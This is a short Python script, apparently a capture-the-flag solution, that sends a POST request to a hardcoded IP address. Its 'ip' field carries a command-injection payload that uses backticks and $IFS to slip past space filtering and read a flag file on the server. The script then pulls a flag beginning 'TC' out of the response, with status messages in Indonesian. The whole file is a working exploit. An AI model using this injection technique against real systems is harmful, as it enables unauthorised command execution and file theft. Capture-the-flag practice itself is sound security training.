import requests

url = 'http://103.185.44.122:6779'

data = {
    'ip': '`more$IFS/sup3rsecr3td1rectory/flag.txt`'
}

response = requests.post(url, data=data)


if response.status_code == 200:
    print("Data berhasil dikirim!")

    start_index = response.text.find("TC")
    end_index = response.text.find("}", start_index) + 1

    if start_index != -1 and end_index != -1:
        print("FLAG :", response.text[start_index:end_index])
    else:
        print("gagal")
